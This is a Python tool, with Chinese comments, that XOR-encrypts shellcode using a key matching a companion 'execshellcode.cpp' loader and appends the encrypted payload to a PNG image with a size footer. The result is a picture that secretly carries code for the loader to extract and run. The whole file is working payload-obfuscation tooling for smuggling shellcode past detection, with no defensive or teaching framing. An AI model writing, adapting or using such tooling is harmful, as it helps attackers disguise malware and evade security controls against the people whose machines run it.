import sys
import os
import struct

def xor_crypt(data: bytes, key: int) -> bytes:
    """与 execshellcode.cpp 中 xor_decrypt 完全一致的算法"""
    result = bytearray(len(data))
    for i in range(len(data)):
        key_val = key % (i + 1)
        result[i] = data[i] ^ (key_val & 0xFF)
    return bytes(result)

KEY = 0x20255202


def cmd_encrypt():
    """加密 bin: python xor_encrypt.py <input.bin> [output.bin]"""
    if len(sys.argv) < 2:
        print(f"Usage: python {sys.argv[0]} <input.bin> [output.bin]")
        print(f"       python {sys.argv[0]} --pack <png_file> <shellcode.bin> [output.png]")
        sys.exit(1)

    in_path = sys.argv[1]
    out_path = sys.argv[2] if len(sys.argv) > 2 else in_path + ".enc"

    with open(in_path, "rb") as f:
        data = f.read()
    enc = xor_crypt(data, KEY)
    with open(out_path, "wb") as f:
        f.write(enc)
    print(f"[*] Encrypted: {in_path} -> {out_path} ({len(enc)} bytes)")


def cmd_pack():
    """打包 PNG + 加密 shellcode: python xor_encrypt.py --pack <png> <shellcode.bin> [output]"""
    args = [a for a in sys.argv if a != "--pack"]
    if len(args) < 3:
        print(f"Usage: python {sys.argv[0]} --pack <png_file> <shellcode.bin> [output.png]")
        sys.exit(1)

    png_path  = args[1]
    sc_path   = args[2]
    out_path  = args[3] if len(args) > 3 else png_path + ".packed.png"

    with open(png_path, "rb") as f:
        png_data = f.read()
    with open(sc_path, "rb") as f:
        sc_data = f.read()

    # 加密 shellcode
    enc_sc = xor_crypt(sc_data, KEY)

    # 打包: [PNG] + [encrypted_shellcode] + [4字节 PNG 原始大小]
    packed = png_data + enc_sc + struct.pack("<I", len(png_data))

    with open(out_path, "wb") as f:
        f.write(packed)

    print(f"[*] PNG:        {png_path} ({len(png_data)} bytes)")
    print(f"[*] Shellcode:  {sc_path} ({len(sc_data)} bytes)")
    print(f"[*] Encrypted:  {len(enc_sc)} bytes")
    print(f"[*] Footer:     4 bytes (png_size = {len(png_data)})")
    print(f"[*] Packed:     {out_path} ({len(packed)} bytes)")

    # 验证解析
    footer_png_size = struct.unpack("<I", packed[-4:])[0]
    parsed_sc = packed[footer_png_size:-4]
    dec_sc = xor_crypt(parsed_sc, KEY)
    assert dec_sc == sc_data, "Verify FAILED!"
    print("[*] Verify:     OK (round-trip matches)")


if __name__ == "__main__":
    if "--pack" in sys.argv:
        cmd_pack()
    else:
        cmd_encrypt()
